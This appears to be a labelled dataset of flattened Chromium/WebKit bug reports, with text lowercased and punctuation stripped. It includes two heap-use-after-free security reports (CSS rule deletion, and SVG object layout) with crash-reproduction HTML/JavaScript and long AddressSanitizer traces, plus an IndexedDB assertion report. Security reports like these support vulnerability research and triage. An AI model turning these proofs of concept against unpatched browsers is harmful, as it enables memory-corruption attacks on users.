12:37 13:49 14:59 15:6 16:9 17:5 frees by size class 8:8594 9:265 10:319 11:109 12:14 13:36 14:45 15:4 16:2 17:4 rfrees by size class stats malloc large 5 small slow 69 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
failing assertion in idbtransaction.cpp when reloading a page that uses indexeddb i occasionally get assertion failed a finished transaction tried to enqueue an event of type abort m_finished third_party/webkit/source/webcore/storage/idbtransaction.cpp 185 void webcore idbtransaction enqueueevent passrefptr webcore event	11
heap-use-after-free in webcore cssstyleselector matchrulesforlist vulnerability details use-after-free bug can be triggered when accessing element css after deleting rule version crash on 18.0.1000.0 developer build 116831 linux and 16.0.912.75 m windows7 x64 does not crash on 16.0.912.63 ubuntu 10.10 x64 reproduction case html head script function body_start q document.getelementbyid root contentdocument document.open q.stylesheets 0 deleterule 1 q.getelementbyid head clonenode 1 script head body object data a.html id root onload body_start object body html a.html html head id='head title id='test poc title style html test style head html for crashes please include the following additional information 19176 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in wtf refptr webcore cssmutablestyledeclaration get const usr/local/google/asan/asan-llvm-trunk/llvm/projects/compiler-rt/lib/asan/asan_linux.cc:0 1 in webcore cssstyleselector matchrulesforlist wtf vector webcore ruledata 0ul const int int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstyleselector.cpp:756 2 in webcore cssstyleselector matchrules webcore ruleset int int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstyleselector.cpp:654 3 in webcore cssstyleselector matchallrules webcore cssstyleselector matchresult media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstyleselector.cpp:854 4 in webcore cssstyleselector styleforelement webcore element webcore renderstyle bool bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstyleselector.cpp:1307 5 in webcore element styleforrenderer media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1025 6 in webcore htmltitleelement textwithdirection media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmltitleelement.cpp:84 7 in webcore htmltitleelement childrenchanged bool webcore node webcore node int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmltitleelement.cpp:61 8 in webcore containernode appendchild wtf passrefptr webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:667 9 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 10 in webcore element cloneelementwithchildren media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:157 11 in webcore element clonenode bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:151 12 in webcore containernode clonechildnodes webcore containernode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:865 13 in webcore element cloneelementwithchildren media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:157 14 in webcore element clonenode bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:151 15 in webcore nodeinternal clonenodecallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8node.cpp:217 16 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 17 in 18 in 19 in 20 in 21 in 22 in 23 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 24 in v8 internal isolate handle_scope_implementer media/chromium/chromium/depot_tools/src/v8/src/isolate.h:838 25 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:428 26 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:403 27 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:69 28 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:152 29 in webcore v8abstracteventlistener handleevent webcore scriptexecutioncontext webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:98 30 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:214 31 in webcore eventtarget fireeventlisteners webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:199 32 in webcore node handlelocalevents webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2730 33 in webcore eventdispatcher dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:319 34 in webcore eventdispatchmediator dispatchevent webcore eventdispatcher const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatchmediator.cpp:51 35 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:55 36 in webcore node dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2744 37 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 38 in webcore document dispatchwindowloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3649 39 in webcore document implicitclose media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:2226 40 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:740 41 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:676 42 in webcore document finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4396 43 in webcore htmldocumentparser preparetostopparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:153 44 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:234 45 in wtf refptr webcore documentloader operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:66 46 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 47 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:647 48 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 49 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:168 50 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 51 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 52 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:172 53 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 54 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:897 55 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 56 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 57 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 58 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 59 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 60 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 61 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 62 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 63 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:271 is located 16 bytes inside of 32-byte region freed by thread t0 here 0 in free 0 1 in wtf vector wtf refptr webcore cssrule 0ul remove unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/vector.h:1099 2 in webcore cssstylesheet deleterule unsigned int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstylesheet.cpp:177 3 in webcore cssstylesheetinternal deleterulecallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8cssstylesheet.cpp:113 4 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 5 in 6 in 7 in 8 in 9 in 10 in 11 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 12 in v8 internal isolate handle_scope_implementer media/chromium/chromium/depot_tools/src/v8/src/isolate.h:838 13 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:428 14 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:403 15 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:69 16 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:152 17 in webcore v8abstracteventlistener handleevent webcore scriptexecutioncontext webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:98 18 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:214 19 in webcore eventtarget fireeventlisteners webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:199 20 in webcore node handlelocalevents webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2730 21 in webcore eventdispatcher dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:319 22 in webcore eventdispatchmediator dispatchevent webcore eventdispatcher const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatchmediator.cpp:51 23 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:55 24 in webcore node dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2744 25 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 26 in webcore document dispatchwindowloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3649 27 in webcore document implicitclose media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:2226 28 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:740 29 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:676 previously allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/fastmalloc.cpp:268 2 in webcore cssstylerule create webcore cssstylesheet int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstylerule.h:39 3 in webcore cssparser createstylerule wtf vector wtf ownptr webcore cssparserselector 0ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssparser.cpp:7634 4 in cssyyparse void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssgrammar.y:847 5 in webcore cssparser parsesheet webcore cssstylesheet wtf string const int wtf hashmap webcore cssstylerule wtf refptr webcore cssrulesourcedata wtf ptrhash webcore cssstylerule wtf hashtraits webcore cssstylerule wtf hashtraits wtf refptr webcore cssrulesourcedata media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssparser.cpp:282 6 in webcore cssstylesheet parsestringatline wtf string const bool int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstylesheet.cpp:217 7 in wtf refptr webcore cssstylesheet operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:66 8 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 9 in webcore styleelement finishparsingchildren webcore element media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/styleelement.cpp:110 10 in webcore htmlstyleelement finishparsingchildren media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlstyleelement.cpp:66 11 in webcore htmlelementstack popcommon media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmlelementstack.cpp:596 12 in webcore htmltreebuilder processendtag webcore atomichtmltoken media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:2164 13 in webcore htmltreebuilder constructtreefromatomictoken webcore atomichtmltoken media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:474 14 in webcore htmltreebuilder constructtreefromtoken webcore htmltoken media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:461 15 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:263 16 in webcore htmldocumentparser append webcore segmentedstring const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:372 17 in webcore decodeddatadocumentparser appendbytes webcore documentwriter char const unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/decodeddatadocumentparser.cpp:50 18 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 19 in webkit frameloaderclientimpl committedload webcore documentloader char const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1118 20 in void wtf derefifnotnull webcore documentloader webcore documentloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:52 21 in webcore resourceloader didreceivedata char const int long long bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:291 22 in void wtf derefifnotnull webcore mainresourceloader webcore mainresourceloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:52 19176 aborting stats 31m malloced 24m for red zones by 61911 calls stats 1m realloced by 1161 calls stats 27m freed by 47654 calls stats 0m really freed by 0 calls stats 80m 20493 full pages mmaped in 20 calls mmaps by size class 8:65532 9:8191 10:4095 11:2047 12:1024 13:1024 14:256 15:256 16:64 17:64 18:16 19:8 21:4 mallocs by size class 8:48844 9:6771 10:3288 11:1241 12:351 13:990 14:135 15:224 16:18 17:40 18:1 19:4 21:4 frees by size class 8:36629 9:5623 10:2962 11:881 12:240 13:949 14:109 15:217 16:11 17:24 18:1 19:4 21:4 rfrees by size class stats malloc large 49 small slow 334 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
heap-use-after-free in webcore frameview forcelayoutparentviewifneeded vulnerability details use-after-free can be caused when trying to layout the view for object containing svg version 18.0.1000.0 developer build 116831 linux 16.0.912.75 m windows 7 x64 reproduction case crash does not happen immediately some seconds should be passed probably it can require to be run twice link href none.css rel stylesheet type text/css object id o data a.svg object a id a style content counter item a script setinterval next_step 1 function next_step document.getelementbyid a appendchild document.getelementbyid o clonenode 1 document.stylesheets 0 insertrule font color black 0 location.reload script a.svg svg xmlns xmlns xlink font-face font-face-src font-face-uri xlink href font-face-src font-face svg for crashes please include the following additional information 10389 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderobject document const usr/local/google/asan/asan-llvm-trunk/llvm/projects/compiler-rt/lib/asan/asan_linux.cc:0 1 in webcore renderobject frame const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:550 2 in webcore frameview forcelayoutparentviewifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:937 3 in webcore frameview layout bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:1213 4 in webcore document implicitclose media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:2269 5 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:740 6 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:676 7 in webcore document finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4396 8 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:234 9 in wtf refptr webcore documentloader operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:66 10 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 11 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:647 12 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 13 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:168 14 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 15 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 16 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:172 17 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 18 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:897 19 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 20 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 21 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 22 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 23 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 24 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 25 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 26 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 27 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:271 28 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:455 29 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 30 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 31 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 16 bytes inside of 200-byte region freed by thread t0 here 0 in free 0 1 in webcore renderview releasewidgets wtf vector webcore renderwidget 0ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderview.cpp:649 2 in webcore renderview updatewidgetpositions media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderview.cpp:669 3 in webcore frameview forcelayoutparentviewifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:937 4 in webcore frameview layout bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:1213 5 in webcore document implicitclose media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:2269 6 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:740 7 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:676 8 in webcore document finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4396 9 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:234 10 in wtf refptr webcore documentloader operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:66 11 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 12 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:647 13 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 14 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:168 15 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 16 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 17 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:172 18 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 19 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:897 20 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 21 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 22 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 23 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 24 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 25 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 26 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 27 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 28 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:271 29 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:455 previously allocated by thread t0 here 0 in malloc 0 1 in webcore htmlpluginimageelement createrenderer webcore renderarena webcore renderstyle media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlpluginimageelement.cpp:143 2 in webcore noderendererfactory createrenderer media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/noderenderingcontext.cpp:304 3 in webcore noderendererfactory createrendererifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/noderenderingcontext.cpp:350 4 in webcore node createrendererifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:1427 5 in webcore element attach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:938 6 in webcore htmlpluginimageelement attach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlpluginimageelement.cpp:161 7 in webcore containernode attach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:785 8 in webcore element attach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:946 9 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1055 10 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1128 11 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1128 12 in webcore document recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1562 13 in webcore document updatestyleifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1617 14 in webcore frameview updatelayoutandstyleifneededrecursive media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:2973 15 in webkit webviewimpl layout media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1180 16 in renderwidget dodeferredupdate media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:770 17 in renderwidget dodeferredupdateandsendinputack media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:732 18 in renderwidget onupdaterectack media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:383 19 in bool ipc message dispatch renderwidget renderwidget ipc message const renderwidget renderwidget void renderwidget media/chromium/chromium/depot_tools/src/./ipc/ipc_message.h:137 20 in renderwidget onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:212 21 in renderviewimpl onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/renderer/render_view_impl.cc:703 22 in messagerouter routemessage ipc message const media/chromium/chromium/depot_tools/src/content/common/message_router.cc:46 10389 aborting stats 128m malloced 175m for red zones by 611109 calls stats 10m realloced by 21154 calls stats 124m freed by 590352 calls stats 17m really freed by 57226 calls stats 300m 76820 full pages mmaped in 75 calls mmaps by size class 8:442341 9:49146 10:49140 11:20470 12:5120 13:4096 14:512 15:128 16:64 17:32 18:16 21:2 mallocs by size class 8:477814 9:50723 10:52615 11:20493 12:4460 13:4451 14:381 15:129 16:15 17:24 18:2 21:2 frees by size class 8:461160 9:47895 10:52219 11:19750 12:4388 